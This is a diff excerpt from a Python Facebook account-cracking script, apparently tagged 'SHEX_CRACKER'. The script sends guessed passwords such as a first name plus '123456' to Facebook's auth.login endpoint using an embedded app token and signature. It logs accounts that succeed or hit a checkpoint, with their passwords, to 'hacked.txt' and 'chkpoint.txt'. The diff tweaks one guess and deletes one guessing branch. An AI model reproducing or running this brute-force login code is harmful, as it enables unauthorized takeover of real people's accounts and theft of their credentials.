@@ -471,7 +471,7 @@ def startgrab():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 ="11223344"											
+										                           pass8 =first+"123456"											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:
@@ -535,29 +535,7 @@ def startgrab():
 																	       cek = open("chkpoint.txt", "a")
 																               cek.write("{ = SHEX BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n Tele: @SHEX_CRACKER")
 			 												               cek.close()		
-												                                               cekpoint.append(user+pass10)
-		                                                                                                                  else:
-				                                                                                                        pass11 = first+"123456"									
-                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			                                                                                                                q = json.load(data)												
-			                                                                                                                if 'access_token' in q:
-				                                                                                                        print('\x1b[32;1m HACK Bu bzhi blnd'+"\x1b[0m")											
-				                                                                                                        print('\x1b[32;1mID : \x1b[37;1m' + user)											
-				                                                                                                        print('\x1b[32;1mPassword : \x1b[37;1m' + pass2 + '\n'+"\x1b[0m")
-                                                                                                                                        msghkfile = ("{ = SHEX BLND = } "+"\nHACK Bu bzhi blnd "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n Tele: @SHEX_CRACKER")
-				                                                                                                        filehack = open("hacked.txt", "a")
-                                                                                                                                        filehack.write(msghkfile)
-                                                                                                                                        filehack.close()							
-				                                                                                                        oks.append(user+pass11)
-                                                                                                                                   else:
-			                                                                                                                if 'www.facebook.com' in q["error_msg"]:
-				                                                                                                        print('\x1b[31;1mACCOUNT Daki bagan chwa chekpointa')
-				                                                                                                        print('\x1b[31;1mID : \x1b[37;1m' + user)
-				                                                                                                        print('\x1b[31;1mPassword : \x1b[37;1m' + pass2  + '\n'+'\x1b[0m')
-				                                                                                                        cek = open("chkpoint.txt", "a")
-				                                                                                                        cek.write("{ = SHEX BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n Tele: @SHEX_CRACKER")
-				                                                                                                        cek.close()
-				                                                                                                        cekpoint.append(user+pass11)								
+												                                               cekpoint.append(user+pass10)		                                                                                          								
 except:   
 			pass
 		
